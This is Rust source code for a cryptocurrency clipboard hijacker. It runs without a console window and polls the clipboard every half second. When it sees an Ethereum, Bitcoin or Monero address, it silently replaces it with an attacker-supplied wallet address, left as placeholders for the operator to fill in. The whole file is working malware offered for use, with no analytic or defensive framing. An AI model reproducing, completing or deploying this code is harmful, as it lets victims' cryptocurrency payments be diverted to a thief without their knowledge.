#![windows_subsystem = "windows"]
#[macro_use] extern crate lazy_static;
extern crate regex;

use arboard::Clipboard;
use tokio::time;
use regex::Regex;

const ETH_ADDRESS: &str = "YOUR ETH ADDRESS";
const BIT_ADDRESS: &str = "YOUR BIT ADDRESS!";
const MON_ADDRESS: &str = "YOUR MON ADDRESS!";



async fn run() {
    let mut clipboard = Clipboard::new().unwrap();
    let text = clipboard.get_text().unwrap();
    
    lazy_static! {
        static ref ETH_REGEX: Regex = Regex::new(r"(0x)[a-fA-F0-9]{40}").unwrap();
        static ref BIT_REGEX: Regex = Regex::new(r"([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}").unwrap();
        static ref MON_REGEX: Regex = Regex::new(r"(4)([0-9]|[A-B])(.){93}").unwrap();
    }

    if text.as_str() != ETH_ADDRESS || text.as_str() != BIT_ADDRESS || text.as_str() != MON_ADDRESS{
        match ETH_REGEX.captures(text.as_str()) {
            Some(_caps) => clipboard.set_text(ETH_ADDRESS.into()).unwrap(),
            None => {}
        }
        match MON_REGEX.captures(text.as_str()) {
            Some(_caps) => clipboard.set_text(MON_ADDRESS.into()).unwrap(),
            None => {}
        }
        match BIT_REGEX.captures(text.as_str()) {
            Some(_caps) => clipboard.set_text(BIT_ADDRESS.into()).unwrap(),
            None => {}
        }
    }
}

#[tokio::main]
async fn main() {
    let mut interval = time::interval(time::Duration::from_millis(500));
    loop {
        interval.tick().await;
        run().await;
    }
}